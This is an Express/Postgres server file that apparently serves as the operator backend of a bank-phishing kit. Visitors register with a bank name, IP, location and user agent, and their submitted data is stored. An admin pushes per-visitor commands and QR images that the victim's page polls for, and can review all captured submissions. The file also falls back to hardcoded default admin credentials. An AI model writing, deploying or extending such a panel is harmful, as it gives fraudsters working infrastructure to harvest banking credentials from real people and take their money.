import "dotenv/config";
import cors from "cors";
import express from "express";
import crypto from "crypto";
import { initDb, pool } from "./db.js";
import { cloudinaryDestroy, cloudinaryEnabled, cloudinaryPublicConfig, cloudinarySignParams } from "./cloudinary.js";

const app = express();
app.use(cors());
app.use(express.json({ limit: "8mb" }));

const ADMIN_USER = process.env.ADMIN_USER || "admin";
const ADMIN_PASS = process.env.ADMIN_PASS || "admin123";
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "admin-token-change-me";
const tokens = new Set([ADMIN_TOKEN]);

function requireAdmin(req, res, next) {
  const t = req.headers["x-admin-token"];
  if (t && tokens.has(t)) return next();
  return res.status(401).json({ error: "unauthorized" });
}

app.get("/api/health", (_, res) => res.json({ ok: true, at: Date.now() }));

// --- admin login ---
app.post("/api/admin/login", (req, res) => {
  const { username, password } = req.body || {};
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const t = "t_" + crypto.randomBytes(16).toString("hex");
    tokens.add(t);
    return res.json({ ok: true, token: t });
  }
  return res.status(401).json({ error: "invalid credentials" });
});

// --- visitor register (public) ---
app.post("/api/visitors", async (req, res) => {
  try {
    const v = req.body || {};
    if (!v.id) return res.status(400).json({ error: "id required" });
    await pool.query(
      `INSERT INTO visitors(id, bank, bank_name, status, ip, city, country, ua, joined_at, last_seen)
       VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10)
       ON CONFLICT (id) DO UPDATE SET
         bank=EXCLUDED.bank, bank_name=EXCLUDED.bank_name,
         ip=EXCLUDED.ip, city=EXCLUDED.city, country=EXCLUDED.country,
         ua=EXCLUDED.ua, last_seen=EXCLUDED.last_seen,
         status=CASE WHEN visitors.status IS NULL THEN EXCLUDED.status ELSE visitors.status END`,
      [v.id, v.bank || "", v.bankName || "", v.status || "waiting", v.ip || "", v.city || "", v.country || "", v.ua || "", v.joinedAt || Date.now(), Date.now()]
    );
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

app.post("/api/visitors/:id/heartbeat", async (req, res) => {
  try {
    const { id } = req.params;
    const p = req.body || {};
    await pool.query(
      `UPDATE visitors SET last_seen=$2, bank=COALESCE(NULLIF($3,''),bank), bank_name=COALESCE(NULLIF($4,''),bank_name), status=COALESCE(NULLIF($5,''),status) WHERE id=$1`,
      [id, Date.now(), p.bank || "", p.bankName || "", p.status || ""]
    );
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

// visitor polls its latest command (public, per-id)
app.get("/api/visitors/:id/command", async (req, res) => {
  try {
    const { rows } = await pool.query("SELECT * FROM commands WHERE visitor_id=$1", [req.params.id]);
    res.json({ command: rows[0] || null });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

// visitor polls its uploaded QR (public, per-id; BIL flow)
app.get("/api/visitors/:id/qr", async (req, res) => {
  try {
    const { rows } = await pool.query("SELECT * FROM qr_uploads WHERE visitor_id=$1", [req.params.id]);
    if (!rows[0]) return res.json({ qr: null });
    const r = rows[0];
    const storage = r.storage || "inline";
    const image = storage === "cloudinary" ? r.url || "" : r.image;
    if (!image) return res.json({ qr: null });
    res.json({ qr: { image, at: Number(r.at), storage } });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

// --- submissions (public submit) ---
app.post("/api/submissions", async (req, res) => {
  try {
    const s = req.body || {};
    if (!s.id || !s.visitorId || !s.kind) return res.status(400).json({ error: "id, visitorId, kind required" });
    await pool.query(
      `INSERT INTO submissions(id, visitor_id, bank, kind, data, at)
       VALUES($1,$2,$3,$4,$5,$6) ON CONFLICT (id) DO NOTHING`,
      [s.id, s.visitorId, s.bank || "", s.kind, JSON.stringify(s.data || {}), s.at || Date.now()]
    );
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

// --- admin protected ---
app.get("/api/admin/visitors", requireAdmin, async (_, res) => {
  try {
    const { rows } = await pool.query("SELECT * FROM visitors ORDER BY last_seen DESC LIMIT 200");
    res.json({
      visitors: rows.map((r) => ({
        id: r.id, bank: r.bank, bankName: r.bank_name, status: r.status,
        ip: r.ip, city: r.city, country: r.country, ua: r.ua,
        joinedAt: Number(r.joined_at), lastSeen: Number(r.last_seen),
      })),
    });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

app.post("/api/admin/commands", requireAdmin, async (req, res) => {
  try {
    const { visitorId, command } = req.body || {};
    if (!visitorId || !command) return res.status(400).json({ error: "visitorId, command required" });
    await pool.query(
      `INSERT INTO commands(visitor_id, type, at, by) VALUES($1,$2,$3,'admin')
       ON CONFLICT (visitor_id) DO UPDATE SET type=EXCLUDED.type, at=EXCLUDED.at`,
      [visitorId, command, Date.now()]
    );
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

app.get("/api/admin/submissions", requireAdmin, async (req, res) => {
  try {
    const { visitorId } = req.query;
    const { rows } = visitorId
      ? await pool.query("SELECT * FROM submissions WHERE visitor_id=$1 ORDER BY at DESC LIMIT 200", [visitorId])
      : await pool.query("SELECT * FROM submissions ORDER BY at DESC LIMIT 200");
    res.json({
      submissions: rows.map((r) => ({
        id: r.id, visitorId: r.visitor_id, bank: r.bank, kind: r.kind,
        data: r.data, at: Number(r.at),
      })),
    });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

app.delete("/api/admin/visitors/:id", requireAdmin, async (req, res) => {
  try {
    await pool.query("DELETE FROM visitors WHERE id=$1", [req.params.id]);
    await pool.query("DELETE FROM commands WHERE visitor_id=$1", [req.params.id]);
    // one image only: visitor removal also deletes its QR (Cloudinary asset + row)
    try {
      const { rows } = await pool.query("SELECT * FROM qr_uploads WHERE visitor_id=$1", [req.params.id]);
      if (rows[0]?.storage === "cloudinary") await cloudinaryDestroy(rows[0].image);
      await pool.query("DELETE FROM qr_uploads WHERE visitor_id=$1", [req.params.id]);
    } catch {}
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

// --- QR uploads: ONE image per visitor (Cloudinary, inline fallback) ---
// Public (non-secret) upload settings for the admin browser (unsigned preset).
app.get("/api/admin/cloudinary", requireAdmin, (_, res) => {
  res.json({ ok: true, ...cloudinaryPublicConfig() });
});

// Signed upload params (no preset needed) — secret stays on the server.
app.post("/api/admin/cloudinary-sign", requireAdmin, (req, res) => {
  if (!cloudinaryEnabled()) return res.status(503).json({ error: "cloudinary not configured" });
  res.json({ ok: true, ...cloudinarySignParams(req.body?.folder) });
});

// Point the visitor at a new image. Replacing deletes the old Cloudinary
// asset first, so exactly one image exists per visitor at all times.
app.post("/api/admin/qr", requireAdmin, async (req, res) => {
  try {
    const { visitorId, publicId, url, image } = req.body || {};
    if (!visitorId || ((!publicId || !url) && !image))
      return res.status(400).json({ error: "visitorId + publicId/url|image required" });
    const prev = await pool.query("SELECT * FROM qr_uploads WHERE visitor_id=$1", [visitorId]);
    if (publicId && url) {
      if (!cloudinaryEnabled()) return res.status(503).json({ error: "cloudinary not configured" });
      if (prev.rows[0]?.storage === "cloudinary" && prev.rows[0].image !== publicId)
        await cloudinaryDestroy(prev.rows[0].image);
      await pool.query(
        `INSERT INTO qr_uploads(visitor_id, image, url, at, storage) VALUES($1,$2,$3,$4,'cloudinary')
         ON CONFLICT (visitor_id) DO UPDATE SET image=EXCLUDED.image, url=EXCLUDED.url, at=EXCLUDED.at, storage='cloudinary'`,
        [visitorId, publicId, url, Date.now()]
      );
      return res.json({ ok: true, storage: "cloudinary", url });
    }
    // inline fallback (data URL in Postgres)
    if (prev.rows[0]?.storage === "cloudinary") await cloudinaryDestroy(prev.rows[0].image);
    await pool.query(
      `INSERT INTO qr_uploads(visitor_id, image, url, at, storage) VALUES($1,$2,'',$3,'inline')
       ON CONFLICT (visitor_id) DO UPDATE SET image=EXCLUDED.image, url='', at=EXCLUDED.at, storage='inline'`,
      [visitorId, image, Date.now()]
    );
    res.json({ ok: true, storage: "inline" });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

app.delete("/api/admin/qr/:visitorId", requireAdmin, async (req, res) => {
  try {
    const { rows } = await pool.query("SELECT * FROM qr_uploads WHERE visitor_id=$1", [req.params.visitorId]);
    if (rows[0]?.storage === "cloudinary") await cloudinaryDestroy(rows[0].image);
    await pool.query("DELETE FROM qr_uploads WHERE visitor_id=$1", [req.params.visitorId]);
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

const PORT = process.env.PORT || 4000;
initDb().then(() => app.listen(PORT, () => console.log(`[api] listening on ${PORT}`)));
